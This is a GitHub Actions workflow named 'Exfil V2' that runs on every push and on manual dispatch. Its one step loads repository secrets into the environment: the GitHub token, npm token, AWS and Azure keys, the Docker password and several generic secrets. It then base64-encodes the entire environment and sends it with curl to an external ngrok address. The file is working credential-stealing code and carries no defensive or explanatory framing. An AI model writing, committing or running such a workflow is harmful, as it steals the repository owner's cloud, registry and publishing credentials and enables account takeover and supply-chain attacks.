name: Exfil V2
on:
  push:
  workflow_dispatch:

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump and send
        run: |
          # Directly echo secrets into the environment
          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> $GITHUB_ENV
          echo "SECRET_1=${{ secrets.SECRET_1 }}" >> $GITHUB_ENV
          echo "SECRET_2=${{ secrets.SECRET_2 }}" >> $GITHUB_ENV
          echo "SECRET_3=${{ secrets.SECRET_3 }}" >> $GITHUB_ENV
          echo "SECRET_4=${{ secrets.SECRET_4 }}" >> $GITHUB_ENV
          echo "SECRET_5=${{ secrets.SECRET_5 }}" >> $GITHUB_ENV
          echo "NPM_TOKEN=${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
          echo "AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}" >> $GITHUB_ENV
          echo "AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}" >> $GITHUB_ENV
          echo "AZURE_CLIENT_SECRET=${{ secrets.AZURE_CLIENT_SECRET }}" >> $GITHUB_ENV
          echo "DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}" >> $GITHUB_ENV
          
          # Now dump everything and send
          env | base64 -w 0 | curl -X POST -d @- https://july-reorder-overlaid.ngrok-free.dev
